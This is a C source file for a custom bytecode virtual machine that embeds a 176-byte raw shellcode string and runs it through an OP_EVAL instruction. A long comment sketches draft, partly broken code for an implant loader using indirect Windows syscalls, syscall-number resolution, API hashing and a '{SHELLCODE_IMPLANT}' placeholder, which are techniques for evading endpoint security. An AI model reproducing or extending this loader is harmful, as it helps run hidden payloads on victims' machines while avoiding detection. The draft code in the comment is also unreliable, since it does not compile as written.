#include "../include/common.h"
#include "../include/vm.h"
#include "../include/instr.h"
#include "../include/debug.h"

int main(int argc, char** argv){

    VM VirtualMachine   = {0};
    OpArray code        = {0};

    init_vm(&VirtualMachine);
    init_instructions(&code);

    Value shellcode = {
        .value_type = TYPE_STR,
        .as.type_str = create_string("\x21\x0c\x8e\xd2\x01\x0e\xa0\xf2\xe1\x83\x1f\xf8\x61\xac\x8e\xd2\x81\x2d\xac\xf2\x81\xee\xcd\xf2\x41\xce\xe5\xf2\xe1\x03\x1f\xf8\x21\xed\x8d\xd2\xc1\x6d\xae\xf2\xe1\x65\xc8\xf2\x21\x8c\xed\xf2\xe1\x83\x1e\xf8\x21\x08\x8e\xd2\x01\x8e\xad\xf2\x21\x6d\xcc\xf2\x21\x8c\xee\xf2\xe1\x03\x1e\xf8\xe1\x65\x8a\xd2\x21\x6f\xae\xf2\x81\xae\xcc\xf2\xa1\xed\xe5\xf2\xe1\x83\x1d\xf8\xe1\xe5\x8d\xd2\x01\xae\xac\xf2\xc1\x0d\xc0\xf2\xe1\x03\x1d\xf8\xe1\xa5\x8e\xd2\x61\x4e\xae\xf2\xe1\x45\xcc\xf2\x21\xcd\xed\xf2\xe1\x83\x1c\xf8\xff\x03\x1c\xf8\x01\x05\x80\xd2\xe1\x63\x21\xcb\xe1\x83\x1b\xf8\x01\x07\x80\xd2\xe1\x63\x21\xcb\xe1\x03\x1b\xf8\xe0\x03\x01\xaa\xe1\x43\x01\xd1\xe2\x03\x1f\xaa\x70\x07\x80\xd2\xe1\x66\x02\xd4", 176, &VirtualMachine.head),
    };
    uint32_t const_idx = add_constant(&code, shellcode);
    write_instruction(&code, OP_CONST);
    write_operands(&code, const_idx, sizeof(uint32_t));

    write_instruction(&code, OP_POP_REGISTER);
    write_operands(&code, 13, sizeof(uint8_t)); // popping into register 13 can be any number within bound
    
    write_instruction(&code, OP_EVAL);
    write_operands(&code, 1, sizeof(uint8_t));
    write_operands(&code, 13, sizeof(uint8_t));

    write_instruction(&code, OP_EXIT);

    disassemble_array(&code, "Instruction Parcel", &VirtualMachine);
    /*
            [IN COMMON.H HEADER FILE]

    typedef NTSTATUS (NTAPI *NtCreateThread_t)(
        OUT PHANDLE ThreadHandle,
        IN ACCESS_MASK DesiredAccess,
        IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
        IN HANDLE ProcessHandle,
        OUT PCLIENT_ID ClientId,
        IN PCONTEXT ThreadContext,
        IN PINITIAL_TEB InitialTeb,
        IN BOOLEAN CreateSuspended
    );

    typedef NTSTATUS (NTAPI *NtDelayExecution_t)(
        IN BOOLEAN Alertable,
        IN PLARGE_INTEGER DelayInterval
    );

    typedef NTSTATUS (NTAPI *NtContinue_t)(
        IN PCONTEXT ThreadContext,
        IN BOOLEAN RaiseAlert
    );

    typedef NTSTATUS (NTAPI *NtWriteVirtualMemory_t)(
        IN HANDLE ProcessHandle,
        IN PVOID BaseAddress,
        IN PVOID Buffer,
        IN ULONG NumberOfBytesToWrite,
        OUT PULONG NumberOfBytesWritten OPTIONAL
    );

    // Union of Nt function pointers
    typedef union _NtFunctionUnion {
        NtCreateThread_t          NtCreateThread;
        NtDelayExecution_t        NtDelayExecution;
        NtContinue_t              NtContinue;
        NtWriteVirtualMemory_t    NtWriteVirtualMemory;
    } NtFunctionUnion;

            [IN MAIN.C MAIN FUNCTION]

    Value val = {
        .value_type = TYPE_STR,
        .as.type_str = create_string("{SHELLCODE_IMPLANT}", sizeof(implant) - 1),
    }; 
    int constImplant = add_constant(&code, val);
    val = {
        .value_type = TYPE_INT,
        .as.type_int = getSSN("NtCreateProcess");
    }; 
    int constSSN = add_constant(&code, val);
    val = {
        .value_type = TYPE_PTR,     UINT_PTR
        .as.type_ptr = (UINT_PTR)GetProcAddress(GetModuleHandleA("ntdll.dll") , "NtCreateProcess") + 0x12,
    }; 
    int constJMP = add_constant(&code, val);

    Note on the * in the comment
    
    LARGE_INTEGER interval;
    interval.QuadPart = -10000000LL;
    val = {
        .VALUE_TYPE = TYPE_LARGE_INT,
        .as.type_large_int = interval,
    }; 
    int arg2 = add_constant(&code, val);
    val = {
        .VALUE_TYPE = TYPE_BOOL,
        .as.type_bool = false,
    };
   int arg1 = add_constant(&code, val); 


    write_instruction(&code, OP_CONST)
    write_instruction(&code, arg2);

    write_instruction(&code, OP_CONST)
    write_instruction(&code, arg1);
    
    write_instruction(&code, OP_CONST)
    write_instruction(&code, constJMP);

    write_instruction(&code, OP_CONST)
    write_instruction(&code, constSSN);

    write_instruction(&code, OP_NT_CALL);
    write_instruction(&code, 2);

    interpret(Virtual_Machine, &code);


    IDEA:   array of Values that are stored after the pop
            and based on the SSN we resolve the NT fn name
            which pushes its ret val onto the stack then pop 
            the retvalue to the register then set up the stack
            again and call the value


                    [IN VM.C]

    case OP_NT_CALL:{
        Value SSN = pop(vMachine);      // DWORD
        --> check if valid then set 
            the global extern var to SSN.as.DWORD
        Value NtSyscallJump = pop(vMachine);    // uintptr_t
         --> check if valid then set 
            the global extern var to SSN.as.UINTPTR
        int N = *vMachine->instructionPointer;
        vMachine->instructionPointer++;
        Value args[N];
        memset(args, 0, N);
        for(int i = 0; i < N; i++){
            args[i] = pop(vMachine);
        }
        NtFunctionUnion ntFunc;
        const char* syscallFunction = get_fn_from_ssn(SSN.as.DWORD);
        int api_hash = f1nva(syscallFunction);
        switch(api_hash){
            case 0x00544e304:{      // hash for NtDelayExecution
                ntFunc.NtDelayExecution_t = (NtDelayExecution_t)GetProcAddress(hNtdll, "NtDelayExecution");
                if(!ntFunc.NtDelayExecution_t){
                    throw_error(vMachine, "OP_NT_CALL", "Unable to resolve NtFunction Syscall")
                    return VM_NAY
                }
*               ntFunc.NtDelayExecution_t(args[0].as.type_bool, &args[1].as.type_large_int)
                //-->    store the modified param in Pop_Storage in case of function calls like NtVirtualAlloc
                        that update their buffer value
            }
        }
    }
    NtFunc()
    */
    getchar();
    puts("================ Starting VM ================");
    interpret(&VirtualMachine, &code);
    free_vm(&VirtualMachine);
    free_instructions(&code);
    return 0;
}

// clang -Wno-error=gnu-label-as-value -Werror -Wall -pedantic main.c instr.c vm.c gc.c functions.c  debug.c -O2 -o VMI && ./VMI
// clang -Wno-error=gnu-label-as-value -Werror -Wall -pedantic main.c instr.c vm.c gc.c functions.c  debug.c -Os -o VMI && ./VMI
